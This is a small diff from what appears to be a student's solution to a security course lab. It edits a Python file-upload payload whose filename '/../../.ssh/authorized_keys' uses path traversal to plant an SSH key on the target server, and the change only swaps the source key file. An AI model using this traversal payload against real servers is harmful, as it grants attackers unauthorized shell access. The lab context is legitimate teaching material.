@@ -5,7 +5,7 @@ files={
     'file':(
         '/../../.ssh/authorized_keys',
         open(
-            '/workspaces/2023-ikt222-assignment-4/code/solutions/attack_3/authorized_keys',
+            '/workspaces/2023-ikt222-assignment-4/code/solutions/attack_2/authorized_keys',
             'rb'
         ),
         'application/octet-stream'
